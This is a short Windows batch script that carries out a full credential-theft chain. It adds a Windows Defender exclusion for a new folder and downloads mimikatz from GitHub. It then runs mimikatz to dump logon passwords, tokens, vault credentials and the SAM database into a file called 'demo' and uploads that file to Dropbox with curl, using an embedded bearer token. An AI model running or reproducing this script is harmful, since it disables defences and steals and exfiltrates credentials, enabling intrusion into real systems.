@echo on
mkdir C:\MuchFun666
powershell.exe Add-MpPreference -ExclusionPath "C:\MuchFun666"
cd C:\MuchFun666 && curl.exe -L -O https://raw.githubusercontent.com/whichbuffer/Windows_AntiDebugging/master/mimikatz.exe
mimikatz.exe "privilege::debug" "log demo" "sekurlsa::logonpasswords full" "token::elevate" "vault::cred" "lsadump::sam" "exit"
curl -X POST https://content.dropboxapi.com/2/files/upload  --header "Authorization: Bearer 7JJkhlXm9DUAAAAAAAAAAeeRVJ0MoYaEu70Mvc-7lYDpbTLx8XBThUKfKfq05GFW "  --header "Dropbox-API-Arg: {\"path\": \"/demo\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @demo
